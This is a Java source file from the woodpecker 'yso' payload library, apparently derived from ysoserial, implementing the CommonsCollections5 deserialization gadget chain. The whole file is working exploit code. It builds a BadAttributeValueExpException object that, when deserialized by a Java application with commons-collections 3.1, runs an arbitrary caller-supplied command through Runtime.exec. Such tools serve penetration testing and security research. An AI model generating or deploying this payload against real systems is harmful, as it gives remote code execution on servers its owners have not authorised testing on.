package me.gv7.woodpecker.yso.payloads;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import me.gv7.woodpecker.yso.payloads.custom.CommonsCollectionsUtil;
import me.gv7.woodpecker.yso.payloads.util.JavaVersion;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import me.gv7.woodpecker.yso.payloads.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;

/*
	Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

	Requires:
		commons-collections
 */
/*
This only works in JDK 8u76 and WITHOUT a security manager

https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
		        new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = CommonsCollectionsUtil.getTransformerList(command);

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
		valfield.set(val, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections5.class, args);
	}

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
